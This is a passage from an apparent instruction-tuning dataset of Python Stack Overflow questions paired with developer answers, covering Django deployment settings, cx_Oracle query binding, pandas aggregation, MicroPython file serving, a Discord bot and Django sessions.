'main.storage.ManifestStaticFilesStorageNotStrict'\n<\/code><\/pre>\n\n<p><em>local_settings.py (redacted)<\/em><\/p>\n\n<pre><code># Production settings\n\nDEBUG = False\n\n###################\n# ALLOWED DOMAINS #\n###################\n\nALLOWED_HOSTS = [\n    'localhost',\n    'localhost:8000',\n    '127.0.0.1',\n    '127.0.0.1:8000',\n    &lt;DOMAIN DATA HERE (: &gt;\n]\n\n\n#############\n# DATABASES #\n#############\n\nDATABASES = {\n    &lt;DATABASE DATA HERE (: &gt;\n}\n\n\n################\n# STATIC FILES #\n################\n\nSTATIC_ROOT = '&lt;PATH TO SERVER STATIC FOLDER&gt;'\n\nMEDIA_ROOT = '&lt;PATH TO SERVER STATIC FOLDER&gt;\/media'\n<\/code><\/pre>\n\n<p>Thanks in advance.<\/p>","output_text":"<p>Well, after hitting my head to the wall a lot, a good night sleep and fresh ideas, I found the problem. It was the silliest thing ever, as usual.<\/p>\n\n<p>If you can see in the <em>settings.py<\/em>, the <code>MEDIA_URL<\/code> is set to <code>\/media\/<\/code>. Normally, this wouldn't be a problem in an Apache server but in WebFaction, it turned out to be the culprit of my headache.<\/p>\n\n<p>For those who don't know, WebFaction obliges you to create apps for everything: Python env, PHP env, Static env, WordPress, Joomla, etc. By creating an app, you have to assing a unique path inside the Website definition, which is a set of apps running under a given domain, so all apps have paths under the same domain and you don't have to modify (in most cases) the <code>httpd.conf<\/code> file.<\/p>\n\n<p>I have an app for the Django code and another app for the static files, under the domain <code>static\/<\/code>. In the <code>local_settings.py<\/code>, you can see that the <code>MEDIA_ROOT<\/code> is inside this static path.<\/p>\n\n<p>In a regular Apache deploy, you just assign the <code>\/media\/<\/code> URL to the path and that's it. In WebFaction, given that there is no static app for using the <code>media\/<\/code>, the <code>MEDIA_URL<\/code> variable has to have <code>static\/media<\/code> as assigned value when switching to <code>DEBUG = False<\/code>.<\/p>\n\n<p>Just to remember: <code>DEBUG = False<\/code> make Django stop serving the static files and leave that entirely to the server where is deployed. So, in <code>DEBUG = True<\/code>, it didn't matter which was the media URL because Django is smart enough to see past that. But when I made the switch to <code>DEBUG = False<\/code>, it naturally failed.<\/p>\n\n<p>Silly me, but well, this is how we learn.<\/p>\n\n<p>Regards.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python Cx_Oracle select query binding a tupled list with WHERE IN clause<p>Due to Oracle's 1000 &quot;IN&quot; clause limit, one workaround is to use list tuples. I am attempting this in Python but cant seem to bind the list tuple correctly.<\/p>\n<p>My code:<\/p>\n<pre><code>mylist = [(1, item1), (1, item2), (1, item3) ... (1, item1500)]\nformat_strings = ','.join(':%d' % i for i in range(len(mylist)))\nquery = '''\n        select x, y, z from table where (1, column_name) IN (%s)\n        '''%format_strings\nwith myconnection as connection:\n    cursor = connection.cursor()\n    cursor.execute(query, mylist)\n    result = cursor.fetchall()\n    ...\n<\/code><\/pre>\n<p>This gives me error: cx_Oracle.NotSupportedError: Python value of type tuple not supported.<\/p>\n<p>Whats the possible workaround for this error? Thanks<\/p>","output_text":"<p>Your python is generating the following query string...<\/p>\n<pre><code>select x, y, z from table where (1, column_name) IN (:0,:1,:2,...,:n)\n<\/code><\/pre>\n<p>Then you're trying to supply a list of tuples as the parameters.<\/p>\n<br>\n<p>Perhaps instead generate this string, and supply a simple list for the parameters...<\/p>\n<pre><code>select x, y, z from table where (1, column_name) IN ((1,:0),(1,:1),(1,:2),...,(1,:n))\n<\/code><\/pre>\n<p>For example...<\/p>\n<pre><code>mylist = [item1, item2, item3, ..., item1500]\nformat_strings = ','.join('(1,:%d)' % i for i in range(len(mylist)))\nquery = '''\n        select x, y, z from table where (1, column_name) IN (%s)\n        '''%format_strings\nwith myconnection as connection:\n    cursor = connection.cursor()\n    cursor.execute(query, mylist)\n    result = cursor.fetchall()\n    ...\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n A way to handle overflow in a dynamic system identification<p>I'm trying to use the scipy.optimize library in a system identification problem I'm working on. The goal is to find a vector of weights <code>w<\/code> that can simulate a single variable dynamic system as accurately as possible. I defined the function I'm trying to minimize, which in this case retuns the error of the identified simulation and the real system, schematically:<\/p>\n\n<pre><code>fQ(w): \n  simulatedOutput = simulate_system(); \n  e = realOutput-simulatedOutput\n  return dot(e,e)\n<\/code><\/pre>\n\n<p>Since I'm trying to dynamically simulate a certain time period, there are certain configurations of the vector w for which the system is not stable and it diverges. The critical part of the code in the function <code>fQ(w)<\/code> is:                <\/p>\n\n<pre><code>for i in range(0, nx):\n                    for j in range(i, nx):\n                        for l in range(j, nx):\n                            colx[k, idx] = x[k, i] * x[k, j] * x[k, l]\n                            idx += 1\n<\/code><\/pre>\n\n<p>Is there a way to handle this potential overflow? What I tried to do was<\/p>\n\n<pre><code>        idx = 0\n        try :\n            for i in range(0, nx):\n                for j in range(i, nx):\n                    for l in range(j, nx):\n                        colx[k, idx] = x[k, i] * x[k, j] * x[k, l]\n                        idx += 1\n        except :\n            print('ColX overflow, returning a large Q')\n            return 10e40\n<\/code><\/pre>\n\n<p>which, technically, seems to be correct, since the real system does not diverge and this vector w is thus a wrong solution to the optimization problem.<\/p>\n\n<p>My issues with this solution are following:<\/p>\n\n<p>i) Using try try\/catch structure anywhere other than handling errors is, to my knowledge, a very bad programming practice<\/p>\n\n<p>ii) It doesn't seem to work right<\/p>\n\n<p>My questions are: <\/p>\n\n<p>Is there a proper way to implement this functionality? Is using a try\/catch structure in instances like this permissible, assuming I know precisely what I'm trying to do?<\/p>","output_text":"<p>I implemented a solution, which checks whether the vector values seem to be increasing over a reasonable value and return a large number in the optimization function.<\/p>\n\n<pre><code>        idx = 0\n        for i in range(0, nx):\n           for j in range(i, nx):\n                colx[k, idx] = x[k, i] * x[k, j]\n                if colx[k, idx] &gt; 10e10:\n                    print('ColX seems to diverge, returning a large Q')\n                    return 10e10\n                idx += 1\n<\/code><\/pre>\n\n<p>This seems to work well. Perhaps a smaller number than <code>10e10<\/code> would work well to increase the general speed of the optimization.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n cumsum bounded within a range(python, pandas)<p>I have a df where I'd like to have the cumsum be bounded within a range of 0 to 6. Where sum over 6 will be rollover to 0. The adj_cumsum column is what I'm trying to get. I've search and found a couple of posts using loops, however, since mine is more straightforward, hence, is wondering whether there is a less complicated or updated approach.<\/p>\n<pre>\n+----+-------+------+----------+----------------+--------+------------+\n|    | month | days | adj_days | adj_days_shift | cumsum | adj_cumsum |\n+----+-------+------+----------+----------------+--------+------------+\n|  0 | jan   |   31 |        3 |              0 |      0 |          0 |\n|  1 | feb   |   28 |        0 |              3 |      3 |          3 |\n|  2 | mar   |   31 |        3 |              0 |      3 |          3 |\n|  3 | apr   |   30 |        2 |              3 |      6 |          6 |\n|  4 | may   |   31 |        3 |              2 |      8 |          1 |\n|  5 | jun   |   30 |        2 |              3 |     11 |          4 |\n|  6 | jul   |   31 |        3 |              2 |     13 |          6 |\n|  7 | aug   |   31 |        3 |              3 |     16 |          2 |\n|  8 | sep   |   30 |        2 |              3 |     19 |          5 |\n|  9 | oct   |   31 |        3 |              2 |     21 |          0 |\n| 10 | nov   |   30 |        2 |              3 |     24 |          3 |\n| 11 | dec   |   31 |        3 |              2 |     26 |          5 |\n+----+-------+------+----------+----------------+--------+------------+\n<\/pre>\n<pre><code>data = {&quot;month&quot;: ['jan','feb','mar','apr',\n                 'may','jun','jul','aug',\n                 'sep','oct','nov','dec'], \n       &quot;days&quot;: [31,28,31,30,31,30,31,31,30,31,30,31]}\ndf = pd.DataFrame(data)\n\ndf['adj_days'] = df['days'] - 28\ndf['adj_days_shift'] = df['adj_days'].shift(1)\ndf['cumsum'] = df.adj_days_shift.cumsum()\ndf.fillna(0, inplace=True)\n<\/code><\/pre>\n<p>Kindly advise<\/p>","output_text":"<p>What you are looking for is called a modulo operation.<\/p>\n<p>Use <code>df['adj_cumsum'] = df['cumsum'].mod(7)<\/code>.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Pycharm warning - 'Relative import outside of a package'<p>Here's the working folder structure<\/p>\n<pre><code>foo\/\n\u251c\u2500 foo\/\n\u2502  \u251c\u2500 __init__.py\n__main__.py\n<\/code><\/pre>\n<p>Here's what <code>__main__.py<\/code> looks like:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from .foo import bar\n\nbar()\n<\/code><\/pre>\n<p>Here's what the <code>__init__.py<\/code> looks like:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def bar():\n    print(&quot;hello&quot;)\n    pass\n<\/code><\/pre>\n<p>When I do <code>python -m foo<\/code> from outside root, it works as expected. However, PyCharm complains about the <code>from .foo import bar<\/code> line. The warning message is:<\/p>\n<blockquote>\n<p>Relative import outside of a package<\/p>\n<\/blockquote>\n<p>If the problematic line is changed to <code>from foo import bar<\/code>, PyCharm doesn't complain but I get following error when running <code>python -m foo<\/code>:<\/p>\n<blockquote>\n<p>ImportError: cannot import name 'bar' from 'foo' (unknown location)<\/p>\n<\/blockquote>\n<p>Is there a way to have it work while resolving PyCharm warnings?<\/p>","output_text":"<p>You may be able to get rid of the warnings by turning the top-level <code>foo<\/code> directory into its own package.<\/p>\n<p>Adding an <code>__init__.py<\/code> to top-level <code>foo<\/code> directory might get the job done.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Micropython Webserver: Serve large textfiles without memory allocation failure<p>My project includes a webserver using an <strong>ESP32<\/strong> and <strong>micropython v1.12<\/strong><\/p>\n<h3>Background:<\/h3>\n<p>I want to create config page which allows me to enter WiFi credentials for connection my ESP to my home network. I\u2019m doing this running a webserver running on my ESP32 at start. For this I planned using Bootstrap and their CSS Style sheet.<\/p>\n<p>Basically I'm starting the server using:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>server_socket = socket.socket()\nserver_socket.bind(addr)\nserver_socket.listen(1)\n...\n<\/code><\/pre>\n<p>If a client connects to my webserver, I'm parsing the URL and calling a <code>handle<\/code>-method. This is also the case for my <em>css<\/em>-files.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code># Get the URL\nurl = ure.search(&quot;(?:GET|POST) \/(.*?)(?:\\\\?.*?)? HTTP&quot;, request).group(1).decode(&quot;utf-8&quot;).rstrip(&quot;\/&quot;)\n\n# Math the url\nif url == &quot;&quot;:\n  handle_root(client)\nelif url == &quot;bootstrap.min.css&quot;:\n  handle_css(client, request, path='bootstrap.min.css')\nelse:\n  handle_not_found(client, url)\n<\/code><\/pre>\n<p>I'm responding using the following lines of code:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def handle_css(client, request, path):\n  wlan_sta.active(True)\n  path = '.\/config_page\/' + path # The path to the css\n  f = open(path, 'r') # Open the file\n  client.send(f.read()) # Read the file and send it\n  client.close()\n  f.close()\n<\/code><\/pre>\n<p>The file <code>bootstrap.min.css<\/code> has around 141kB. I'm running out of memory reading this file and sending it using the socket:<\/p>\n<pre><code>MemoryError: memory allocation failed, allocating 84992 bytes\n<\/code><\/pre>\n<p>Is there a way to serve &quot;big&quot; files like the <em>.css<\/em> file? The config page depends on some these files.<\/p>","output_text":"<p>Sure. The problem here is probably this line <code>client.send(f.read())<\/code> which reads the entire file to memory and sends it to the client. Instead of reading the entire file at once, try reading it in 1KB chunks and sending those to the client.<\/p>\n<pre><code>f = open(path, 'r') # Open the file\nwhile True:\n    chunk = f.read(1024) # Read the next 1KB chunk\n    if not chunk:\n        break\n    client.send(chunk) # Send the next 1KB chunk\nclient.close()\nf.close()\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n For loop stops after returning results of 1st element<p>I have the following scraping script. I need to loop through many links which differ by T_ID's included in data dictionary. The script is printing the result only for the first T_ID. Any idea how to improve this loop so it prints results for all T_ID's?<\/p>\n<pre><code>import requests  \nimport json\nimport csv\nimport sys\n\nfrom bs4 import BeautifulSoup\n\ndata = {'T_ID': [3396750, 3396753, 3396755, 3396757, 3396759]}\n\nbase_url = &quot;XXXX&quot;  \nusername = &quot;XXXX&quot;  \npassword = &quot;XXXX&quot;\ntoget = data\n\nallowed_results = 50  \nmax_results = &quot;maxResults=&quot; + str(allowed_results)\ntc = &quot;\/tcyc?&quot;\n\nresult_count = -1  \nstart_index = 0  \n\ndf = pd.DataFrame(\n   columns=['id', 'name', 'gId', 'dKey', 'tPlan'])\n\nfor eachId in toget['T_ID']:\n    while result_count != 0:  \n        start_at = &quot;startAt=&quot; + str(start_index)\n        url = url = f'{base_url}{eachId}{tc}&amp;{start_at}&amp;{max_results}'  \n        response = requests.get(url, auth=(username, password))  \n        json_response = json.loads(response.text)\n        print(json_response)\n        page_info = json_response[&quot;meta&quot;][&quot;pageInfo&quot;]\n        start_index = page_info[&quot;startIndex&quot;] + allowed_results  \n        result_count = page_info[&quot;resultCount&quot;]\n        items2 = json_response[&quot;data&quot;]\n        print(items2)\n\n        for item in items2:\n            new_item = {'id': item['id'], **item['fields']}\n            df = df.append(new_item, ignore_index=True)\n            print (item[&quot;id&quot;])\n            print (item[&quot;project&quot;])\n            print (item[&quot;fields&quot;][&quot;name&quot;])\n            print (item[&quot;fields&quot;][&quot;gId&quot;])\n            print (item[&quot;fields&quot;][&quot;dKey&quot;])\n            print (item[&quot;fields&quot;][&quot;tPlan&quot;])\n<\/code><\/pre>","output_text":"<p>It doesn't stop, it actually runs all the way through. The issue is the <code>start_index<\/code> after it iterates through the first <code>eachId<\/code> is no longer <code>0<\/code>. So when it gets to the next id, it's looking at something like:<\/p>\n<pre><code>`'XXXX.com\/3396753\/tcyc?&amp;startAt=123&amp;maxResults=50'`\n<\/code><\/pre>\n<p>And then likely returning a <code>result_count<\/code> of <code>0<\/code>, which means the while loop doesn't run. Then it goes to the next id, and the same thing occurs.<\/p>\n<p>Move your initial <code>result_count = -1<\/code> and <code>start_index = 0<\/code> within the loop, before the <code>while<\/code>. As you'd want those to &quot;reset&quot; for each <code>'T_ID'<\/code>:<\/p>\n<pre><code>import pandas as pd\nimport requests  \nimport json\nimport csv\nimport sys\n\nfrom bs4 import BeautifulSoup\n\ndata = {'T_ID': [3396750, 3396753, 3396755, 3396757, 3396759]}\n\nbase_url = &quot;XXXX&quot;  \nusername = &quot;XXXX&quot;  \npassword = &quot;XXXX&quot;\ntoget = data\n\nallowed_results = 50  \nmax_results = &quot;maxResults=&quot; + str(allowed_results)\ntc = &quot;\/tcyc?&quot;\n\n\n\n\ndf = pd.DataFrame(\n   columns=['id', 'name', 'gId', 'dKey', 'tPlan'])\n\nfor eachId in toget['T_ID']:\n    start_index = 0  \n    result_count = -1  \n    while result_count != 0:  \n        start_at = &quot;startAt=&quot; + str(start_index)\n        url = url = f'{base_url}{eachId}{tc}&amp;{start_at}&amp;{max_results}'  \n        response = requests.get(url, auth=(username, password))  \n        json_response = json.loads(response.text)\n        print(json_response)\n        page_info = json_response[&quot;meta&quot;][&quot;pageInfo&quot;]\n        start_index = page_info[&quot;startIndex&quot;] + allowed_results  \n        result_count = page_info[&quot;resultCount&quot;]\n        items2 = json_response[&quot;data&quot;]\n        print(items2)\n\n        for item in items2:\n            new_item = {'id': item['id'], **item['fields']}\n            df = df.append(new_item, ignore_index=True)\n            print (item[&quot;id&quot;])\n            print (item[&quot;project&quot;])\n            print (item[&quot;fields&quot;][&quot;name&quot;])\n            print (item[&quot;fields&quot;][&quot;gId&quot;])\n            print (item[&quot;fields&quot;][&quot;dKey&quot;])\n            print (item[&quot;fields&quot;][&quot;tPlan&quot;])\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n I'm trying to send an image using a discord bot but its only sending the file name<p>I'm trying to pull the image randomly out of a folder, yet it only show the image name.<\/p>\n<pre><code>@client.event\nasync def on_message(message):\n    if message.author == client.user:\n        return\n\nif message.content.startswith('$Monke'):\n    arr = os.listdir('C:\/Users\/cmalc\/Documents\/Word\/School shit\/Coding\/Thonny Files\/Discord Bot\/Monke Pictures')\n    await message.channel.send(random.choice(arr))\n<\/code><\/pre>\n<p>I've changed the bottom code to<\/p>\n<pre><code>if message.content.startswith('$Monke'):\n    await message.channel.send(file=discord.File(random.choice('C:\/Use...\n<\/code><\/pre>","output_text":"<p><code>random.choice<\/code> returns one element from the given iterable which now is a string, so it returns a random character. <code>random.choice(arr)<\/code> is the right one to use here. But don't forget to add the path to a file name:<\/p>\n<pre><code>if message.content.startswith('$Monke'):\n    random_file = os.path.join('C:\/Users\/cmalc\/Documents\/Word\/School shit\/Coding\/Thonny Files\/Discord Bot\/Monke Pictures',\n                               random.choice(arr))\n    await message.channel.send(file=discord.File(random_file)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Dataframe Price Average in rows to the specific date<p>basically I've got dataframe with loads of data about real estate. Every day, new data are added for each real estate, most importantly its price, region where the real estate is and the date, that this real estate was added to the dataframe. For every region I want to calculate development of the price every day. I get my dataframe from database like this:<\/p>\n<pre><code>data1 = pd.read_sql_query(\n &quot;SELECT REAL_ESTATE.UNIQUE_RE_NUMBER, REAL_ESTATE.TYP_ID, ADDRESS.ADDRSS, ADDRESS.LOCATION, PRICE.RE_PRICE, MAX(PRICE.UPDATE_DATE) AS UPDATE_DATE, HOUSEINFO.RE_POLOHA, HOUSEINFO.RE_DRUH, HOUSEINFO.RE_TYP, HOUSEINFO.RE_UPLOCHA &quot;\n &quot;FROM REAL_ESTATE INNER JOIN ADDRESS, PRICE, HOUSEINFO ON REAL_ESTATE.ID=ADDRESS.RE_ID AND REAL_ESTATE.ID=PRICE.RE_ID AND REAL_ESTATE.ID=HOUSEINFO.INF_ID GROUP BY REAL_ESTATE.ID &quot;,\n conn)\n\ndata2 = pd.read_sql_query(\n     &quot;SELECT REAL_ESTATE.UNIQUE_RE_NUMBER, REAL_ESTATE.TYP_ID, ADDRESS.ADDRSS, ADDRESS.LOCATION, PRICE.RE_PRICE, MAX(PRICE.UPDATE_DATE) AS UPDATE_DATE, FLATINFO.RE_DISPOZICE, FLATINFO.RE_DRUH, FLATINFO.RE_PPLOCHA &quot;\n     &quot;FROM REAL_ESTATE INNER JOIN ADDRESS, PRICE, FLATINFO ON REAL_ESTATE.ID=ADDRESS.RE_ID AND REAL_ESTATE.ID=PRICE.RE_ID AND REAL_ESTATE.ID=FLATINFO.INF_ID GROUP BY REAL_ESTATE.ID &quot;,\n     conn)\n\ndata3 = pd.read_sql_query(\n     &quot;SELECT REAL_ESTATE.UNIQUE_RE_NUMBER, REAL_ESTATE.TYP_ID, ADDRESS.ADDRSS, ADDRESS.LOCATION, PRICE.RE_PRICE, MAX(PRICE.UPDATE_DATE) AS UPDATE_DATE, LANDINFO.RE_PLOCHA, LANDINFO.RE_DRUH, LANDINFO.RE_SITE, LANDINFO.RE_KOMUNIKACE &quot;\n     &quot;FROM REAL_ESTATE INNER JOIN ADDRESS, PRICE, LANDINFO ON REAL_ESTATE.ID=ADDRESS.RE_ID AND REAL_ESTATE.ID=PRICE.RE_ID AND REAL_ESTATE.ID=LANDINFO.INF_ID GROUP BY REAL_ESTATE.ID &quot;,\n     conn)\n\ndf = [data1, data2, data3]\n\ndff = pd.concat(df)\ndff = dff.reset_index(drop=True)\n<\/code><\/pre>\n<p>For calculating average I have this command:<\/p>\n<pre><code>dff['LOC_DATE_AVG'] = dff.groupby(['LOCATION', 'UPDATE_DATE'])['RE_PRICE'].transform('mean')\n<\/code><\/pre>\n<p>This only shows, what average price was added each day, but I would like to calculate the whole average of every real estate added to a particular date. So when I have data from 1.1.2021, 2.1.2021, 3.1.2021 and when I want to know average to the date 2.1.2021, it would calculate average from 1.1.2021 and also from 2.1.2021. Is it possible?<\/p>","output_text":"<p>It's a bit hard to say without an <a href=\"https:\/\/stackoverflow.com\/help\/minimal-reproducible-example\">mre<\/a> (see also <a href=\"https:\/\/stackoverflow.com\/questions\/20109391\/how-to-make-good-reproducible-pandas-examples\">here<\/a>). Please add one.<\/p>\n<p>You could try:<\/p>\n<pre><code>dff[&quot;UPDATE_DATE&quot;] = pd.to_datetime(dff[&quot;UPDATE_DATE&quot;])  # Just to make sure\nresult = (dff[dff[&quot;UPDATE_DATE&quot;] &lt;= pd.Timestamp(year=2021, month=1, day=2)]\n          .groupby(&quot;LOCATION&quot;)[&quot;RE_PRICE&quot;]\n          .mean())\n<\/code><\/pre>\n<hr \/>\n<p>Regarding your comment: With the sample dataframe (mre :))<\/p>\n<pre><code>df = pd.DataFrame(\n    {\n        &quot;LOCATION&quot;: [&quot;A&quot;, &quot;A&quot;, &quot;A&quot;, &quot;B&quot;, &quot;B&quot;],\n        &quot;UPDATE_DATE&quot;: [&quot;2021-01-01&quot;, &quot;2021-01-02&quot;, &quot;2021-01-03&quot;,\n                        &quot;2021-01-01&quot;, &quot;2021-01-02&quot;],\n        &quot;RE_PRICE&quot;: [1, 2, 3, 1, 2]\n    }\n)\ndf[&quot;UPDATE_DATE&quot;] = pd.to_datetime(df[&quot;UPDATE_DATE&quot;])\n<\/code><\/pre>\n<pre><code>  LOCATION UPDATE_DATE  RE_PRICE\n0        A  2021-01-01         1\n1        A  2021-01-02         2\n2        A  2021-01-03         3\n3        B  2021-01-01         1\n4        B  2021-01-02         2\n<\/code><\/pre>\n<p>this<\/p>\n<pre><code>def cum_mean(sdf):\n    return pd.DataFrame(\n               sdf.query(&quot;UPDATE_DATE &lt;= @day&quot;)[&quot;RE_PRICE&quot;].mean()\n               for day in sdf['UPDATE_DATE'].values\n           )\n\ndf[&quot;CUM_MEAN&quot;] = df.groupby(&quot;LOCATION&quot;).apply(cum_mean).reset_index(drop=True)\n<\/code><\/pre>\n<p>produces<\/p>\n<pre><code>  LOCATION UPDATE_DATE  RE_PRICE  CUM_MEAN\n0        A  2021-01-01         1       1.0\n1        A  2021-01-02         2       1.5\n2        A  2021-01-03         3       2.0\n3        B  2021-01-01         1       1.0\n4        B  2021-01-02         2       1.5\n<\/code><\/pre>\n<p>If the <code>UPDATE_DATE<\/code> column is sorted in ascending order (groupwise is enough) you could also do<\/p>\n<pre><code>grouped = df.groupby(&quot;LOCATION&quot;)\ndf[&quot;CUM_MEAN&quot;] = grouped[&quot;RE_PRICE&quot;].cumsum() \/ (grouped.cumcount() + 1)\n<\/code><\/pre>\n<p>which would probably be faster than the other version.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Why do I have a TypeError (Object ... is not JSON serializable) when trying to set a session value in a view?<p>I have this strange TypeError raised : &quot;Object of type Product is not JSON serializable&quot; when I try to set a session value in a view (in <em>basket<\/em> app). The error occurs with <code>request.session['Hello'] = 'foo'<\/code>.<\/p>\n<p>However, this error does not occur elsewhere. For instance, in <em>store<\/em> app, in <em>views.py<\/em>, the following <code>request.session['Hello World'] = 'Alloy'<\/code> works very well.<\/p>\n<p>Why is that happening ?<\/p>\n<h3>basket app \/ <em>views.py<\/em><\/h3>\n<pre><code>from django.shortcuts import render, get_object_or_404\nfrom django.http import JsonResponse\n\nfrom . basket import Basket\nfrom store.models import Product\nfrom discount.forms import UserDiscountForm\n\n\ndef basket_summary(request):\n    basket = Basket(request)\n    context = {'basket':basket}\n    request.session['Hello'] = 'foo'\n    return render(request,&quot;store\/basket_summary.html&quot;,context)\n\n\ndef basket_add(request):\n    basket = Basket(request)\n\n    if request.POST.get('action') == 'post':\n        product_id = int(request.POST.get('productid'))\n        product_qty = int(request.POST.get('productqty'))\n        product = get_object_or_404(Product, id=product_id)\n        basket.add(product=product, qty=product_qty)\n        basketqty = basket.__len__()\n        response = JsonResponse({'qty':basketqty})\n        return response\n\n\ndef basket_add_new(request):\n    basket = Basket(request)\n\n    if request.POST.get('action') == 'post':\n        product_id = int(request.POST.get('productid'))\n        product = get_object_or_404(Product, id=product_id)\n        basket.add_new(product=product)\n        basketqty = basket.__len__()\n        response = JsonResponse({'qty':basketqty})\n        return response\n\n\ndef basket_delete(request):\n    basket = Basket(request)\n\n    if request.POST.get('action') == 'post':\n        product_id = int(request.POST.get('productid'))\n        basket.delete(product=product_id)\n        basketqty = basket.__len__()\n        baskettotal = basket.get_total_price()\n        response = JsonResponse({'qty':basketqty, 'subtotal':baskettotal})\n        return response\n\n\ndef basket_update(request):\n    basket = Basket(request)\n\n    if request.POST.get('action') == 'update-basket':\n        product_id = int(request.POST.get('productid'))\n        product_qty = int(request.POST.get('productqty'))\n        basket.update(product=product_id, qty=product_qty)\n        basketqty = basket.__len__()\n        baskettotal = basket.get_total_price()\n        itemtotal = basket.get_subtotal_price(product=product_id)\n        response = JsonResponse({'qty':basketqty, 'baskettotal':baskettotal, 'product_qty':product_qty, 'itemtotal':itemtotal})\n        return response\n\n<\/code><\/pre>\n<h3>basket app \/ <em>basket.py<\/em><\/h3>\n<pre><code>from decimal import Decimal\n\nfrom store.models import Product\n\n\nclass Basket():\n    def __init__(self, request):\n        self.session = request.session\n        basket = self.session.get('cart')\n\n        if 'cart' not in request.session:\n            basket = self.session['cart'] = {}\n\n        self.basket = basket\n\n\n    def save(self):\n        self.session.modified = True\n\n\n    def add(self, product, qty):\n        &quot;&quot;&quot;\n        Adding and updating basket session data\n        &quot;&quot;&quot;\n        product_id = str(product.id)\n        price = float(product.price)\n        subtotal = qty * price\n\n        if product_id not in self.basket:\n            self.basket[product_id] = {'price': price, 'qty':int(qty), 'subtotal': subtotal}\n\n        else:\n            self.basket[product_id]['qty'] = qty\n            self.basket[product_id]['subtotal'] = subtotal\n\n        self.save()\n\n\n    def add_new(self, product):\n        &quot;&quot;&quot;\n        Adding new item in basket session data\n        &quot;&quot;&quot;\n        product_id = str(product.id)\n\n        if product_id not in self.basket:\n            self.basket[product_id] = {'price': float(product.price), 'qty':1, 'subtotal':float(product.price)}\n            # self.basket[product_id] = {'price': float(product.price), 'qty':1}\n\n        else:\n            pass\n\n        self.save()\n\n\n    def __iter__(self):\n        &quot;&quot;&quot;\n        Collect the product_id in the session data to query the database and return products\n        &quot;&quot;&quot;\n        \n        product_ids = self.basket.keys()\n        products = Product.objects.filter(id__in=product_ids)\n        basket = self.basket.copy()\n\n        for product in products:\n            basket[str(product.id)]['product'] = product\n    \n        for item in basket.values():\n            item['price'] = float(item['price'])\n            item['total_price'] = item['price'] * item['qty']\n    \n            yield item\n\n\n    def __len__(self):\n        &quot;&quot;&quot;\n        Get the basket data and count the quantity of all items\n        &quot;&quot;&quot;\n            \n        return sum(item['qty'] for item in self.basket.values())\n\n\n    def get_total_price(self):\n\n        return sum(float(item['price']) * item['qty'] for item in self.basket.values())\n\n\n    def get_subtotal_price(self, product):\n        product_id = str(product)\n\n        return self.basket[product_id]['qty'] * self.basket[product_id]['price']\n\n\n\n    def delete(self, product):\n        &quot;&quot;&quot;\n        Delete item from session data\n        &quot;&quot;&quot;\n        product_id = str(product)\n\n        if product_id in self.basket:\n            del self.basket[product_id]\n        \n        self.save()\n\n\n    def update(self, product, qty):\n        &quot;&quot;&quot;\n        Update item in session data\n        &quot;&quot;&quot;\n        product_id = str(product)\n        \n        if product_id in self.basket:\n            self.basket[product_id]['qty'] = qty\n            self.basket[product_id]['subtotal'] = self.basket[product_id]['qty'] * self.basket[product_id]['price']\n        \n        self.save()\n\n\n    def clear(self):\n        try:\n            del self.session['cart']\n        except KeyError:\n            pass\n\n        self.save()\n\n<\/code><\/pre>\n<h3>store app \/ <em>models.py<\/em><\/h3>\n<pre><code>from django.db import models\nfrom django.urls import reverse\n\n\nclass Category(models.Model):\n    name = models.CharField(max_length=254, db_index=True)\n    slug = models.SlugField(max_length=254, unique = True)\n\n\n    class Meta:\n        verbose_name_plural = 'categories'\n\n\n    def __str__(self):\n        return self.name\n\n\n\nclass Product(models.Model):\n    category = models.ForeignKey(Category, related_name='product', on_delete=models.CASCADE)\n    title = models.CharField(max_length=254)\n    description = models.TextField(blank=True)\n    image = models.ImageField(upload_to='images\/', default='images\/default.png')\n    slug = models.SlugField(max_length=254, unique = True)\n    price = models.DecimalField(max_digits=5, decimal_places=2)\n    is_active = models.BooleanField(default=True)\n    created = models.DateTimeField(auto_now_add=True)\n    updated = models.DateTimeField(auto_now=True)\n    image2 = models.ImageField(upload_to='images\/', null=True, blank=True)\n    image3 = models.ImageField(upload_to='images\/', null=True, blank=True)\n    stock = models.IntegerField()\n    weight = models.IntegerField(verbose_name='Poids (g)')\n\n\n    class Meta:\n        verbose_name_plural = 'products'\n        ordering = ('-created', ) # ordering in descending order\n\n\n    def get_absolute_url(self):\n        return reverse('store:product_detail', args=[self.slug])\n\n\n    def __str__(self):\n        return self.title\n\n<\/code><\/pre>\n<h3>store app \/ <em>views.py<\/em><\/h3>\n<pre><code>from django.shortcuts import get_object_or_404, render\nfrom requests.sessions import session\n\nfrom .models import Category, Product\n\n\n\ndef home(request):\n    print('----------\/\/ HOME PAGE  \/\/----------')\n    request.session['Hello World'] = 'Alloy'\n    context = {}\n    return render(request, 'store\/home.html', context)\n\n\ndef categories(request):\n    categories = Category.objects.all()\n    context = {'categories': categories}\n    return render(request, 'store\/categories.html', context)\n\n\ndef all_products(request):\n    products = Product.objects.all()\n    context = {'products': products}\n    return render(request, 